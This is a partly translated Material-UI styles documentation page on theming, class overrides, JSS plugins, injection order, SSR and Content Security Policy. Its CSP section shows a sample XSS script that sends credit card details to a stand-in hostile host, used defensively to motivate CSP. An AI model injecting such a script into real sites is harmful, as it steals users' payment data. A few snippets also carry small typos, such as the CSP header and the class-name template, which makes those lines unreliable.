# 高级

<p class="description">本节包含了更多 @material-ui/styles 的进阶用法。</p>

## 主题

添加` ThemeProvider `到应用程序的顶层，将主题传递到React组件树。 然后，您可以在样式函数中访问主题对象。

```jsx
import { ThemeProvider } from '@material-ui/styles';

const theme = {
  background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',
};

function Theming() {
  return (
    <ThemeProvider theme={theme}>
      <DeepChild />
    </ThemeProvider>
  );
}
```

{{"demo": "pages/styles/advanced/Theming.js"}}

### 访问组件中的主题

在组件中访问 @material-ui/styles 主题。

#### `useTheme` hook

```jsx
import { useTheme } from '@material-ui/styles';

function DeepChild() {
  const theme = useTheme();
  return <span>{`spacing ${theme.spacing}`}</span>;
}
```

{{"demo": "pages/styles/advanced/UseTheme.js"}}

#### `withTheme` HOC

```jsx
import { withTheme } from '@material-ui/styles';

function DeepChildRaw(props) {
  return <span>{`spacing ${props.theme.spacing}`}</span>;
}

const DeepChild = withTheme(DeepChildRaw);
```

{{"demo": "pages/styles/advanced/WithTheme.js"}}

### 主题嵌套

您可以嵌套多个主题提供者。 在应用程序的不同区域需要应用不同外观时，这非常有用。

```jsx
<ThemeProvider theme={outerTheme}>
  <Child1 />
  <ThemeProvider theme={innerTheme}>
    <Child2 />
  </ThemeProvider>
</ThemeProvider>
```

{{"demo": "pages/styles/advanced/ThemeNesting.js"}}

内部主题将 **覆盖** 外部主题。 您可以通过提供一个函数来扩展外部主题：

```jsx
<ThemeProvider theme={…} >
  <Child1 />
  <ThemeProvider theme={outerTheme => ({ darkMode: true, ...outerTheme })}>
    <Child2 />
  </ThemeProvider>
</ThemeProvider>
```

## Overriding styles - `classes` prop

` makeStyles ` (hook generator) 和` withStyles ` (HOC) API允许为每个样式表创建多个样式规则。 每个样式规则都有自己的类名。 类名通过` classes `变量传入组件。 在为组件中的嵌套元素设置样式时，这尤其有用。

```jsx
// A style sheet
const useStyles = makeStyles({
  root: {}, // a style rule
  label: {}, // a nested style rule
});

function Nested(props) {
  const classes = useStyles();
  return (
    <button className={classes.root}> // 'jss1'
      <span className={classes.label}> // 'jss2'
        nested
      </span>
    </button>
  );
}

function Parent() {
  return <Nested />
}
```

但是，类名通常是不确定的。 父组件如何覆盖嵌套元素的样式？

### withStyles

这是最简单的情况。 包装组件接受` classes ` 属性， 它简单地合并了样式表提供的类名。

```jsx
const Nested = withStyles({
  root: {}, // a style rule
  label: {}, // a nested style rule
})(({ classes }) => (
  <button className={classes.root}>
    <span className={classes.label}> // 'jss2 my-label'
      Nested
    </span>
  </button>
));

function Parent() {
  return <Nested classes={{ label: 'my-label' }} />
}
```

### makeStyles

Hook API需要多写一点模版代码。 您需要转发父级组件的属性到hook作为第一个参数。

```jsx
const useStyles = makeStyles({
  root: {}, // a style rule
  label: {}, // a nested style rule
});

function Nested(props) {
  const classes = useStyles(props);
  return (
    <button className={classes.root}>
      <span className={classes.label}> // 'jss2 my-label'
        nested
      </span>
    </button>
  );
}

function Parent() {
  return <Nested classes={{ label: 'my-label' }} />
}
```

## JSS plugins

JSS使用插件来扩展其核心，允许您挑选所需的功能， 并且只为您正在使用的内容支付性能开销。

默认情况下，Material-UI不会启用所有插件。 以下（它是 [ jss-preset-default的子集](https://cssinjs.org/jss-preset-default/) ） 被包含在内：

- [jss-plugin-rule-value-function](https://cssinjs.org/jss-plugin-rule-value-function/)
- [jss-plugin-global](https://cssinjs.org/jss-plugin-global/)
- [jss-plugin-nested](https://cssinjs.org/jss-plugin-nested/)
- [jss-plugin-camel-case](https://cssinjs.org/jss-plugin-camel-case/)
- [jss-plugin-default-unit](https://cssinjs.org/jss-plugin-default-unit/)
- [jss-plugin-vendor-prefixer](https://cssinjs.org/jss-plugin-vendor-prefixer/)
- [jss-plugin-props-sort](https://cssinjs.org/jss-plugin-props-sort/)

当然，你可以自由的添加新插件。 我们有一个[](https://github.com/alitaheri/jss-rtl)jss-rtl插件的例子。

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';
import rtl from 'jss-rtl'

const jss = create({
  plugins: [...jssPreset().plugins, rtl()],
});

function App() {
  return (
    <StylesProvider jss={jss}>
      ...
    </StylesProvider>
  );
}

export default App;
```

## 字符串模板

如果您更喜欢CSS语法而不是JSS，则可以使用[ jss-plugin-template ](https://cssinjs.org/jss-plugin-template/)插入。

```jsx
const useStyles = makeStyles({
  root: `
    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);
    border-radius: 3px;
    font-size: 16px;
    border: 0;
    color: white;
    height: 48px;
    padding: 0 30px;
    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);
  `,
});
```

请注意，这不支持选择器或嵌套规则。

{{"demo": "pages/styles/advanced/StringTemplates.js"}}

## CSS 注入顺序

> It's **really important** to understand how the CSS specificity is calculated by the browser, as it's one of the key elements to know when overriding styles. You are encouraged to read this MDN paragraph: [How is specificity calculated?](https://developer.mozilla.org/en-US/docs/Web/CSS/Specificity#How_is_specificity_calculated)

默认情况下，注入的style标签会被插入到页面`<head>`元素的最后。 它们比页面上任何其他样式标签更具特异性，例如CSS模块， styled components。

### injectFirst

`StylesProvider`组件的属性 `injectFirst` 会把style标签注入到head的**前部**(意味着更低的权重)。

```jsx
import { StylesProvider } from '@material-ui/styles';

<StylesProvider injectFirst>
  {/* 你的组件树。
      样式化组件可以覆盖 Material-UI 的样式。 */}
</StylesProvider>
```

### `makeStyles` / `withStyles` / `styled`

使用 `makeStyles` / `withStyles` / `styled` 的注入顺序于调用顺序**相同**。 例如，在这种情况下，红色胜出：

```jsx
import clsx from 'clsx';
import { makeStyles } from '@material-ui/styles';

const useStylesBase = makeStyles({
  root: {
    color: 'blue', // 🔵
  },
});

const useStyles = makeStyles({
  root: {
    color: 'red', // 🔴
  },
});

export default function MyComponent() {
  // Order doesn't matter
  const classes = useStyles();
  const classesBase = useStylesBase();

  // Order doesn't matter
  const className = clsx(classes.root, classesBase.root)

  // color: red 🔴 wins.
  return <div className={className} />;
}
```

Hook 调用顺序和类名顺序**不影响**注入属性权重 。

### insertionPoint

JSS [提供了一种机制](https://github.com/cssinjs/jss/blob/master/docs/setup.md#specify-the-dom-insertion-point)控制这种情况。 通过添加`insertionPoint`到HTML中，你可以[控制](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order)组件中CSS的插入位置。

#### HTML 注释

The simplest approach is to add an HTML comment to the `<head>` that determines where JSS will inject the styles:

```html
<head>
  <!-- jss-insertion-point -->
  <link href="...">
</head>
```

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';

const jss = create({
  ...jssPreset(),
  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.
  insertionPoint: 'jss-insertion-point',
});

function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}

export default App;
```

#### 其他 HTML 元素

创建生产环境时, [Create React App](https://github.com/facebook/create-react-app) 会剥离 HTML 注释。 To get around this issue, you can provide a DOM element (other than a comment) as the JSS insertion point, for example, a `<noscript>` element:

```jsx
<head>
  <noscript id="jss-insertion-point" />
  <link href="..." />
</head>
```

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';

const jss = create({
  ...jssPreset(),
  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.
  insertionPoint: document.getElementById('jss-insertion-point'),
});

function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}

export default App;
```

#### JS createComment

codesandbox.io prevents access to the `<head>` element. To get around this issue, you can use the JavaScript `document.createComment()` API:

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';

const styleNode = document.createComment('jss-insertion-point');
document.head.insertBefore(styleNode, document.head.firstChild);

const jss = create({
  ...jssPreset(),
  // Define a custom insertion point that JSS will look for when injecting the styles into the DOM.
  insertionPoint: 'jss-insertion-point',
});

function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}

export default App;
```

## 服务器端呈现

This example returns a string of HTML and inlines the critical CSS required, right before it’s used:

```jsx
import ReactDOMServer from 'react-dom/server';
import { ServerStyleSheets } from '@material-ui/styles';

function render() {
  const sheets = new ServerStyleSheets();

  const html = ReactDOMServer.renderToString(sheets.collect(<App />));
  const css = sheets.toString();

  return `
<!DOCTYPE html>
<html>
  <head>
    <style id="jss-server-side">${css}</style>
  </head>
  <body>
    <div id="root">${html}</div>
  </body>
</html>
  `;
}
```

You can [follow the server side guide](/guides/server-rendering/) for a more detailed example, or read the [`ServerStyleSheets`](/styles/api/#serverstylesheets) API documentation.

### Gatsby

There is [an official plugin](https://github.com/hupe1980/gatsby-plugin-material-ui) that enables server-side rendering for `@material-ui/styles`. Refer to the plugin's page for setup and usage instructions.

Refer to [this example project](https://github.com/mui-org/material-ui/blob/master/examples/gatsby) for an up-to-date usage example.

### Next.js

You need to have a custom `pages/_document.js`, then copy [this logic](https://github.com/mui-org/material-ui/blob/master/examples/nextjs/pages/_document.js) to inject the server-side rendered styles into the `<head>` element.

Refer to [this example project](https://github.com/mui-org/material-ui/blob/master/examples/nextjs) for an up-to-date usage example.

## Class names

The class names are generated by [the class name generator](/styles/api/#creategenerateclassname-options-class-name-generator).

### 默认值

By default, the class names generated by `@material-ui/styles` are **non-deterministic**; you can't rely on them to stay the same. Let's take the following style as an example:

```js
const useStyles = makeStyles({
  root: {
    opacity: 1,
  },
});
```

This will generate a class name such as `makeStyles-root-123`.

You have to use the `classes` prop of a component to override the styles. The non-deterministic nature of the class names enables style isolation.

- In **development**, the class name is: `.makeStyles-root-123`, following this logic:

```js
const sheetName = 'makeStyles';
const ruleName = 'root';
const identifier = 123;

const className = `${sheetName}-${ruleName}-${identifier}`;
```

- In **production**, the class name is: `.jss123`, following this logic:

```js
const productionPrefix = 'jss';
const identifier = 123;

const className = `${productionPrefix}-${identifier}`;
```

### With `@material-ui/core`

The generated class names of the `@material-ui/core` components behave differently. When the following conditions are met, the class names are **deterministic**:

- Only one theme provider is used (**No theme nesting**)
- The style sheet has a name that starts with `Mui` (all Material-UI components).
- The `disableGlobal` option of the [class name generator](/styles/api/#creategenerateclassname-options-class-name-generator) is `false` (the default).

These conditions are met with the most common use cases of `@material-ui/core`. For instance, this style sheet:

```jsx
const useStyles = makeStyles({
  root: { /* … */ },
  label: { /* … */ },
  outlined: {
    /* … */
    '&$disabled': { /* … */ },
  },
  outlinedPrimary: {
    /* … */
    '&:hover': { /* … */ },
  },
  disabled: {},
}, { name: 'MuiButton' });
```

generates the following class names that you can override:

```css
.MuiButton-root { /* … */ }
.MuiButton-label { /* … */ }
.MuiButton-outlined { /* … */ }
.MuiButton-outlined.Mui-disabled { /* … */ }
.MuiButton-outlinedPrimary: { /* … */ }
.MuiButton-outlinedPrimary:hover { /* … */ }
```

*This is a simplification of the `@material-ui/core/Button` component's style sheet.*

Customization of the TextField can be cumbersome with the [`classes` API](#overriding-styles-classes-prop), where you have to define the the classes prop. It's easier to use the default values, as described above. For example:

```jsx
import styled from 'styled-components';
import { TextField } from '@material-ui/core';

const StyledTextField = styled(TextField)`
  label.focused {
    color: green; 💚
  }
  .MuiOutlinedInput-root {
    fieldset {
      border-color: red; 💔
    }
    &:hover fieldset {
      border-color: yellow; 💛
    }
    &.Mui-focused fieldset {
      border-color: green; 💚
    }
  }
`;
```

{{"demo": "pages/styles/advanced/GlobalClassName.js"}}

## 全局CSS

### `jss-plugin-global`

The [`jss-plugin-global`](#jss-plugins) plugin is installed in the default preset. You can use it to define global class names.

{{"demo": "pages/styles/advanced/GlobalCss.js"}}

### Hybrid

You can also combine JSS generated class names with global ones.

{{"demo": "pages/styles/advanced/HybridGlobalCss.js"}}

## CSS prefixes

JSS uses feature detection to apply the correct prefixes. [Don't be surprised](https://github.com/mui-org/material-ui/issues/9293) if you can't see a specific prefix in the latest version of Chrome. Your browser probably doesn't need it.

## 内容安全政策（CSP）

### 什么是CSP，为什么它有用？

基本上，CSP通过要求开发人员将其资产从中检索的源列入白名单来缓解跨站点脚本（XSS）攻击。 此列表作为服务器的标头返回。 例如，假设您有一个托管在` https://example.com`的网站 CSP头`default-src：'self';`将允许位于`https://example.com/*`的所有资产并否认所有其他人。 如果您的网站的某个部分容易受到XSS的影响而未显示未转义的用户输入，则攻击者可以输入以下内容：

```html
<script>
  sendCreditCardDetails('https://hostile.example');
</script>
```

此漏洞允许攻击者执行任何操作。 但是，使用安全的CSP标头，浏览器将不会加载此脚本。

You can read more about CSP on the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).

### 如何实现CSP？

为了将CSP与Material-UI（和JSS）一起使用，您需要使用nonce。 A nonce is a randomly generated string that is only used once, therefore you need to add server middleware to generate one on each request. JSS有[一个很棒的教程](https://github.com/cssinjs/jss/blob/master/docs/csp.md)关于如何使用Express和React Helmet实现这一目标。 对于基本纲要，请继续阅读。

CSP nonce是Base 64编码的字符串。 你可以这样生成一个：

```js
import uuidv4 from 'uuid/v4';

const nonce = new Buffer(uuidv4()).toString('base64');
```

It is very important that you use UUID version 4, as it generates an **unpredictable** string. 然后，将此随机数应用于CSP标头。 应用了随机数时，CSP标头可能如下所示：

```js
header('Content-Security-Policy')
  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);
```

If you are using Server-Side Rendering (SSR), you should pass the nonce in the `<style>` tag on the server.

```jsx
<style
  id="jss-server-side"
  nonce={nonce}
  dangerouslySetInnerHTML={{ __html: sheets.toString() }}
/>
```

然后，您必须将此随机数传递给JSS，以便将其添加到后续`<style>`标记中。 The client-side gets the nonce from a header. 无论是否使用SSR，都必须包含此标头。

```jsx
<meta property="csp-nonce" content={nonce} />
```